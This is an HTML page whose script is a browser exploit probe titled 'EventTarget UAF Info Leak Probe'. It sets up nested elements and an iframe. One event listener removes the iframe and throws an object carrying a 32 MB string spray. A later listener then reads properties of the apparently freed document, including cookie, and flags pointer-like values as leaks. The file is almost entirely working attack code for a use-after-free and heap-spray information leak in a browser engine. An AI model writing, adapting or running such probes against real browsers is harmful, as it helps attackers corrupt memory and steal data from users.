<!DOCTYPE html>
<html>
<head><meta charset="utf-8"><title>EventTarget Info Leak Probe</title></head>
<body>
<p><button onclick="go()">Click to run leak probe</button></p>
<div id="out" style="font-family:monospace;white-space:pre;color:#0f0;background:#000;"></div>
<script>
'use strict';

// ---------- Logging ----------
const out = document.getElementById('out');
function log(m, c) {
    console.log(m);
    const s = document.createElement('span');
    if (c) s.style.color = c;
    s.textContent = m + '\n';
    out.appendChild(s);
}

// ---------- Suspicious value detector ----------
function isSuspicious(val) {
    const s = String(val);
    // Hex pointer pattern
    if (/\b0x[0-9a-f]{6,16}\b/i.test(s)) return true;
    // Long decimal numbers
    if (/^\d{10,}$/.test(s)) return true;
    // High entropy garbage strings
    if (s.length > 50 && s.replace(/[A-Za-z0-9]/g,'').length > 10) return true;
    return false;
}

function go() {
    log('=== EventTarget UAF Info Leak Probe ===', '#fff');

    // Step 1: Create iframe and event setup
    const f = document.body.appendChild(document.createElement('iframe'));
    const a = document.createElement('div');
    const b = a.appendChild(document.createElement('div'));

    // Listener 1: remove iframe + throw string spray
    a.addEventListener('x', function() {
        log('Listener 1: removing iframe & spraying...');
        document.adoptNode(a);
        f.remove();   // Document may become unreachable

        // Throw with a 32 MB string spray of 'B' characters
        throw {
            line: 1, column: 1,
            sourceURL: 'B'.repeat(1024 * 1024 * 32)
        };
    });

    // Listener 2: no-op
    a.addEventListener('x', () => {});

    // Listener 3: attempt to read freed Document WITHOUT saving a reference
    b.addEventListener('x', function() {
        log('Listener 3: accessing f.contentDocument...');
        try {
            // Try to get document without locking a JS ref
            const doc = f.contentDocument;
            if (!doc) {
                log('  f.contentDocument is null', '#f00');
                return;
            }
            log('  Document still reachable, reading all properties...');

            // List of common Document properties
            const props = [
                'URL', 'documentURI', 'title', 'characterSet', 'contentType',
                'readyState', 'designMode', 'compatMode', 'hidden', 'visibilityState',
                'cookie', 'lastModified', 'location', 'referrer', 'activeElement',
                'body', 'head', 'images', 'links', 'forms', 'scripts',
                'styleSheets', 'all', 'children', 'childElementCount', 'firstElementChild',
                'lastElementChild', 'rootElement', 'scrollingElement', 'documentElement',
                'domain', 'inputEncoding', 'xmlEncoding', 'xmlVersion', 'xmlStandalone',
                'anchors', 'applets', 'embeds', 'plugins', 'baseURI', 'origin',
                'defaultView', 'ownerDocument', 'parentElement'
            ];
            for (const p of props) {
                try {
                    const v = doc[p];
                    const str = String(v);
                    if (isSuspicious(str)) {
                        log(`  ★ LEAK? ${p} = ${str}`, '#ff0');
                    } else {
                        log(`    ${p} = ${str}`);
                    }
                } catch(e) {
                    log(`    ${p} = ERROR: ${e.message}`);
                }
            }
            log('  Property scan done.');
        } catch(e) {
            log('  Exception in listener 3: ' + e.message, '#f00');
        }
    });

    log('Dispatching event...');
    // The dispatch will throw, but the third listener should still execute.
    try {
        b.dispatchEvent(new Event('x', { bubbles: true }));
    } catch(e) {
        log('Main: caught throw (expected)');
    }
    log('=== Probe finished ===', '#fff');
}
</script>
</body>
</html>
